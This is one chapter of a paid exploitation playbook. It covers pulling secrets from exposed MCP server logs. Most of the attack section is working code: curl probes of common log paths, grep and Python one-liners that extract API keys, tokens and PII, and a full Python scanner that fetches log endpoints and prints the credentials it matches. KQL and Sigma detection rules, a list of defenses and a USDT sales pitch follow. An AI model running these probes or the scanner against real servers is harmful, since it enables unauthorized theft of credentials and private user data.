# Chapter 06 — Log Leaks
## The 9099 Files — MCP Exploitation Playbook

---

## What It Is

MCP servers log tool calls, arguments, and results for debugging and auditing. Those logs often contain sensitive data — API keys, file paths, query parameters, user content, and even model responses. If logs are stored insecurely, accessible via misconfiguration, or exposed through a web interface, an attacker can read them and extract credentials, PII, or proprietary information.

Logs don't just capture errors. They capture everything the tool touched. That's the attack surface.

---

## Why This Works

Debugging logs are written to be useful. That means they include full request and response data. When that data includes credentials, tokens, file contents, or user prompts with sensitive information, the logs become a data breach waiting to happen.

Common misconfigurations:
- Logs written to a web-accessible directory
- Logs stored in cloud storage (S3/GCS) with public read permissions
- Logs included in error responses
- Log aggregation services (ELK, Splunk) without proper access controls
- Docker logs that persist container STDERR/STDOUT with sensitive data

---

## The Attack

### Step 1 — Discover Log Locations

```bash
# Common log paths on MCP servers
curl -s http://target:3000/logs/
curl -s http://target:3000/logs/mcp.log
curl -s http://target:3000/logs/access.log
curl -s http://target:3000/debug/logs
curl -s http://target:3000/.logs/mcp.log

# Docker logs endpoint (if exposed)
curl -s http://target:3001/container/logs
docker logs target-container 2>&1 | head -100

# Cloud storage logs
aws s3 ls s3://BUCKET-NAME/logs/
gsutil ls gs://BUCKET-NAME/logs/

# Kubernetes pod logs
kubectl logs -n mcp-deployment mcp-pod --previous
```

### Step 2 — Search Logs for Secrets

```bash
# Download or access logs, then search:
grep -i "password\|secret\|token\|api.key\|aws_access\|Authorization\|Bearer" logs/*.log

# Check for credentials in tool arguments
grep -E "api_key|secret|password|token" logs/mcp.log | python3 -c "
import sys, json, re
for line in sys.stdin:
    try:
        data = json.loads(line)
        if 'params' in data:
            params_str = json.dumps(data['params'])
            if any(s in params_str.lower() for s in ['key', 'token', 'password', 'secret']):
                print(params_str[:300])
    except:
        pass
"

# Check for PII
grep -iE "ssn|credit.card|address|phone|email" logs/*.log
```

### Step 3 — Automated Log Leak Scanner

```python
#!/usr/bin/env python3
"""
MCP Log Leak Scanner
Finds and analyzes MCP server logs for sensitive data exposure
"""
import requests
import re
import json
import sys
from urllib.parse import urljoin

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

LOG_PATTERNS = [
    "logs/", "logs/mcp.log", "log/", "log/mcp.log",
    "debug/logs", ".logs/", "application.log",
    "/logs/access.log", "/var/log/mcp/"
]

SECRET_PATTERNS = [
    (r'api[_-]?key["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})', "API Key"),
    (r'aws[_-]?access[_-]?key[_-]?id["\s:=]+["\']?([A-Z0-9]{20})', "AWS Key"),
    (r'aws[_-]?secret[_-]?access[_-]?key["\s:=]+["\']?([A-Za-z0-9/+=]{40})', "AWS Secret"),
    (r'Bearer\s+([a-zA-Z0-9_\-\.]+)', "Bearer Token"),
    (r'sk-[a-zA-Z0-9]{48}', "OpenAI Key"),
    (r'password["\s:=]+["\']?([^\s"\']{8,})', "Password"),
    (r'secret["\s:=]+["\']?([^\s"\']{16,})', "Secret"),
    (r'token["\s:=]+["\']?([a-zA-Z0-9_\-\.]{20,})', "Token"),
]

def check_log_endpoint(target, path):
    url = urljoin(target, path)
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            return r.text
    except:
        pass
    return None

def scan_logs(target):
    print(f"[*] MCP Log Leak Scanner")
    print(f"[*] Target: {TARGET}\n")
    
    findings = []
    
    for pattern in LOG_PATTERNS:
        content = check_log_endpoint(TARGET, pattern)
        if content:
            print(f"[!] Found log file: {pattern} ({len(content)} bytes)")
            
            # Search for secrets
            for regex, secret_type in SECRET_PATTERNS:
                matches = re.findall(regex, content, re.IGNORECASE)
                if matches:
                    print(f"    [!] {secret_type}: {len(matches)} found")
                    for m in matches[:5]:
                        print(f"        → {m[:60]}")
                    findings.append((pattern, secret_type, len(matches)))
    
    if not findings:
        print("[-] No obvious log leaks found. Manual review recommended.")
    
    return findings

if __name__ == "__main__":
    scan_logs(TARGET)
```

---

## Real Case

**MCP server in production with debug logging**

A developer enables debug logging during testing, forgets to disable it in production. The MCP server logs full request/response cycles including user prompts and API credentials. An attacker who finds the debug endpoint (often at `/debug/logs` or `/logs/mcp.log`) downloads months of conversation history and every credential that passed through the system.

---

## Detection Rules

### KQL

```kql
// Detect access to log endpoints from unexpected sources
MCP_AccessLogs
| where Url contains "/logs" or Url contains "/log"
    and SourceIP !in (trusted_ips)
| project TimeGenerated, Url, SourceIP, StatusCode
```

### Sigma

```yaml
title: MCP Log Access Detected
log_source: mcp_server
detection:
  selection:
    event.type: access
    url|contains:
      - /logs/
      - /log/
      - debug
  condition: selection
level: high
```

---

## Defenses

1. **Never write secrets to logs** — Implement a log sanitizer that redacts API keys, tokens, passwords, and other credentials before logging. Use regex-based replacement in the logging pipeline.

2. **Store logs in access-controlled storage** — Logs should go to a system (S3 with ACLs, GCS with uniform bucket-level access) where only authorized personnel can read them. Not in the web server's document root.

3. **Disable debug endpoints in production** — Debug and logs endpoints should require authentication or be disabled entirely when the service is not in development mode.

4. **Log rotation and retention limits** — Don't keep logs indefinitely. The less history you retain, the less data is exposed if a breach occurs.

5. **Monitor log file access** — Alert if log files are accessed from unexpected IPs or at unusual times.

---

**$29 USDT — Full Playbook with 10 Chapters**

TX hash to `@hunnidinnit` on Telegram.